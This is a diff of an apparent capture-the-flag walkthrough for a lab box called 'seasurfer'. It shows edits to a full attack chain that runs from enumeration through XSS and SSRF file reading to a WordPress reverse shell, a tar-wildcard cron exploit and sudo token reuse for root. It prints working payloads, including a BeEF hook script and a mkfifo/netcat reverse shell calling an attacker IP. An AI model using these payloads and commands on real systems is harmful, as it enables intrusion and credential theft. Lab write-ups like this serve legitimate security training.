@@ -1,4 +1,4 @@
-Target:  10.10.179.66   seasurfer
+**Target:  10.10.179.66   seasurfer**
 
 **Initial Access:**\
 nmap -Pn --min-rate=5000 10.10.179.66 -p- |grep open |awk -F '\n' '{print $1}'|tr '\n' ','\
@@ -16,8 +16,7 @@ Navigate to port 80 finds nothing of interest, just the default apache page.  Di
 Found a strange header: X-Backend-Server: seasurfer.thm\
 Add to /etc/hosts:  10.10.179.66 seasurfer.thm.  Navigate to seasurfer.thm
 
-This site looks like a wordpress site.  Looking at browser extension wappalyzer, it confirms that it’s running wordpress.  Use wpscan to enumerate for usernames: \
-wpscan --url http://seasurfer.thm/ -e u,vp  → found user kyle. 
+This site looks like a wordpress site.  Looking at browser extension wappalyzer, it confirms that it’s running wordpress.  Use wpscan to enumerate: wpscan --url http://seasurfer.thm/ -e u,vp  → found user kyle. 
 
 Run directory brute force: gobuster dir -u http://seasurfer.thm -x txt,php -w /usr/share/wordlists/dirb/big.txt \
 Two interesting directories found with gobuster are /wp-login.php and /adminer.\
@@ -44,7 +43,7 @@ Fill out customer name, additional comment, and item (I’ll use the word ‘tes
  
 A web page that uses user input to create a pdf is often vulnerable to cross site scripting.   A simple search on google for ‘hacktricks pdf converter’ brings up a hacktricks page with plenty of xss payloads for pdf converter: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf 
 
-First, a simple proof of concept payload: < img src="x" onerror="document.write('test')"/>  \
+First, a simple proof of concept payload: ```<img src="x" onerror="document.write('test')"/>```  \
 You can enter this payload into the customer name, additional comment, or item.  The payload works on all 3 of them.  
 
 ![image](https://user-images.githubusercontent.com/93153300/199278315-28b3af69-3ee5-4129-b077-1e8428965eb1.png)
@@ -54,8 +53,7 @@ Running this payload through the pdf converter shows an empty iframe.  It doesn�
 
 ![image](https://user-images.githubusercontent.com/93153300/199278351-e06a840b-bbf2-4784-aaf5-4509c9524e7d.png)
 
-Next, open beef in the browser by going to http://127.0.0.1:3000/ui/panel.  The output from the command beef-xss provides us with the hook we will use:\
-<script src="http://10.2.1.148:3000/hook.js"></script>  
+Next, open beef in the browser by going to http://127.0.0.1:3000/ui/panel.  The output from the command beef-xss provides us with the hook we will use: <script src="http://10.2.1.148:3000/hook.js"></script>  
 Put that hook into one of the user inputs on internal.seasurfer.thm.  Then click on create receipt to run the pdf converter.  The beef browser page shows internal.seasurfer.thm is hooked:
 
 ![image](https://user-images.githubusercontent.com/93153300/199278400-296f28d2-45ac-4fb8-879f-11b2721fc662.png)
@@ -70,11 +68,9 @@ The browser.name.reported shows wkhtmltopdf.  A quick google search on wkhtmltop
  
 Console shows the version of wkhtmltopdf is 0.12.5.  This version is vulnerable to ssrf, and can be used to read local files (lfi) on the target.   
 
-***(I restarted my machine here: so the target ip address changed to: 10.10.139.0 )
-
 Steps for ssrf to lfi:\
-Step 1: create a php file with the following content: <?php header('location:file://'.$_REQUEST['file']); ?> \
-Step 2: host the php file with a php web server: php -S 0.0.0.0:80  (Don’t use a python web server because it won’t execute our hosted php file.) \
+Step 1: create a php file with the following content:  ```<? php header('location:file://'.$_REQUEST['file']); ?>```\
+Step 2: host the php file with a php web server: php -S 0.0.0.0:80  (Don’t use a python web server because it won’t execute our hosted php file.)\
 Step 3: Go to the pdf creator page on internal.seasurfer.thm, and insert in one of the user input fields the following payload: <iframe height="5000" width="1000" src=http://10.2.1.148/testing.php?file=/etc/passwd></iframe>
 
 Running the pdf creator with these 3 steps works, it shows the /etc/passwd file:
@@ -95,7 +91,7 @@ Save the hash in a file and call it hash.  Use command ‘nth’ to find the typ
 nth returns that the hash is Wordpress ≥ v2.6.2, HC: 400 JtR: phpass.   Crack the hash with hashcat:\
 hashcat -m 400 hash  /usr/share/wordlists/rockyou.txt → cracked: jenny4ever
 
-Use these credentials to log into wordpress on wp-login.php.  Next, use plugin editor to get reverse shell, follow these steps: click on plugins (on the left panel)→ plugin file editor → select plugin to edit hello dolly (top right corner) → hello.php→  Replace hello.php content with php pentest monkey reverse shell → click update file (bottom left corner).  Open netcat listener: nc -lvnp 443 (I will use pwncat-cs -lp 443 bc pwncat gives a better shell).  Navigate to seasurfer.thm/wp-content/plugins/hello.php.  We get shell as www-data. 
+Use these credentials to log into wordpress on wp-login.php.  Next, use the plugin editor to get a reverse shell, follow these steps: click on plugins (on the left panel)→ plugin file editor → select plugin to edit hello dolly (top right corner) → hello.php→  Replace hello.php content with php pentest monkey reverse shell → click update file (bottom left corner).  Open netcat listener: nc -lvnp 443 (I will use pwncat-cs -lp 443 bc pwncat gives a better shell).  Navigate to seasurfer.thm/wp-content/plugins/hello.php.  We get shell as www-data. 
 _______________________________________________
 **Lateral Movement**:\
 Found crontab running tar with wildcard in /var/www/internal/maintenance/backup.sh:
@@ -103,7 +99,7 @@ Found crontab running tar with wildcard in /var/www/internal/maintenance/backup.
 ![image](https://user-images.githubusercontent.com/93153300/199278733-211fe847-c670-4495-8ae7-5c4af8a4f751.png)
  
 Google search ‘crontab tar wildcard’ shows plenty of articles that will show how to exploit this.\
-To exploit, run these commands in www-data shell.  Also, make sure to run these commands in directory /var/www/internal/invoices. Because the file backup.sh shows that the tar is being run on files in that specific directory.\ 
+The file backup.sh shows that the tar command is being run on files in /var/www/internal/invoices directory, so make sure to run the following commands in that directory.\
 Step 1: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.148 443 >/tmp/f" > shell.sh \
 Step 2: echo "" > "--checkpoint-action=exec=sh shell.sh" \
 Step 3: echo "" > --checkpoint=1 \
@@ -124,17 +120,17 @@ Go to the hacktricks page linpeas referenced, and go to the ‘Reusing Sudo Toke
 
 ![image](https://user-images.githubusercontent.com/93153300/199278840-b50b900f-c1be-4f8e-a1e4-3ad014beb630.png)
  
-Hacktricks shows what we need in order for this exploit to work.  Let’s check and see if we have what is needed to use this exploit.  We have shell as kyle, so that fulfills the first requirement.  The second requires we have used sudo in the last 15 minutes.  As we mentioned above, linpeas showed that kyle has a sudo process running, so we have the second requirement.  Linpeas showed us that ptrace protection is 0, so we have the third requirement.  However, we do not have gdb.  We can’t install gdb with apt install because we need sudo for that.   But we can install gdb with dpkg.  Download gdb from http://old-releases.ubuntu.com/ubuntu/pool/universe/g/gdb/ (I chose gdb-multiarch_9.1-0ubuntu1_amd64.deb).  Upload downloaded gdb to the target.  Install gdb uploaded to the target with command: dpkg -x  gdb-multiarch_9.1-0ubuntu1_amd64.deb gdbfile. \
+Hacktricks shows what we need in order for this exploit to work.  Let’s check and see if we have what is needed to use this exploit.  We have shell as kyle, so that fulfills the first requirement.  The second requires we have used sudo in the last 15 minutes.  As we mentioned above, linpeas showed that kyle has a sudo process running, so we have the second requirement.  Linpeas showed us that ptrace protection is 0, so we have the third requirement.  However, we do not have gdb.  We can’t install gdb with apt install because we need sudo for that.   But we can install gdb with dpkg.  Download gdb from http://old-releases.ubuntu.com/ubuntu/pool/universe/g/gdb/ (I chose gdb-multiarch_9.1-0ubuntu1_amd64.deb).  Upload the downloaded gdb to the target.  Next, install the gdb we uploaded to the target with command: dpkg -x  gdb-multiarch_9.1-0ubuntu1_amd64.deb gdbfile. \
 Set the path: export PATH=$PATH:/home/kyle/gdbfile/usr/bin.  Go to /home/kyle/gdbfile/usr/bin and change the name to gdb: mv gdb-multiarch gdb.\
-Next, download the github sudo_inject that hacktricks showed above: git clone https://github.com/nongiach/sudo_inject.git.   Go to the ‘extra tools’ directory in sudo_inject and run command make.  Upload  the sudo_inject directory to the target.   \
+Next, download the github sudo_inject that hacktricks showed above: git clone https://github.com/nongiach/sudo_inject.git.   Go to the ‘extra tools’ directory in sudo_inject and run command ‘make’.  Upload  the sudo_inject directory to the target.   \
 Run exploit.sh_v2.sh: bash exploit_v2.sh → creates a suid sh shell in /tmp  \
 Run command: /tmp/sh -p \
 Got shell as root
 
 ![image](https://user-images.githubusercontent.com/93153300/199278893-910dce3e-c715-465f-8073-a437ece36aa0.png)
-  
-Understanding how the exploit works and manual exploitation: \
-What this exploit does is actually pretty simple.  Gdb connects to the process id that is running the sudo command.  Once gdb connects to the process that is running sudo, we can execute commands from gdb with sudo.  \
+ _____________________________________________________________ 
+**Understanding how the exploit works/manual exploitation:** \
+What this exploit does is actually pretty simple.  Gdb connects to the process id that is running the sudo command.  Once gdb connects to the process that is running sudo, we can execute commands from gdb with sudo privileges.  \
 To exploit manually, these are the commands: \
 ps aux| grep kyle    → found process id 1145 for the process running sudo \
 gdb -q -n -p 1145 \
